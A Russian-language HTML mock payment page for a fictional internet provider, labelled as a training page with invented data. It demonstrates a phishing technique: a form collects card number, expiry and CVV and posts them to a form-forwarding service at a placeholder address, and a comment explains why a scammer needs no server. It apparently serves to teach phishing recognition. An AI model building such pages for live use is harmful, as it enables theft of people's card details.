<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Оплата подключения</title><link rel="stylesheet" href="page.css">
<style>:root{--c:#15803d}</style></head>
<body>
<div class="site"><div class="logo">С</div><b>СетьПлюс – домашний интернет</b><span>учебная страница · все данные вымышлены</span></div>
<main>
<!-- Сервис пересылки форм (formsubmit.co и подобные) отправляет заполненную форму владельцу на почту.
     Так устроена настоящая страница «Wi5 Telecommunications» (urlscan.io): сервер мошеннику не нужен. -->
<div class="box"><h1>Оплата подключения</h1><div class="total"><span>Итого</span><span>540 ₽</span></div></div>
<form class="box" action="https://formsubmit.co/payments.setplus@example.invalid" method="post" onsubmit="return false">
  <label for="cc">Номер карты</label><input id="cc" name="card" autocomplete="cc-number" placeholder="0000 0000 0000 0000">
  <div class="row"><div><label for="exp">Срок действия</label><input id="exp" name="exp" autocomplete="cc-exp"></div>
  <div><label for="cvc">CVV</label><input id="cvc" name="cvv" autocomplete="cc-csc"></div></div>
  <button type="submit">Оплатить 540 ₽</button>
</form>
</main>
</body>
</html>
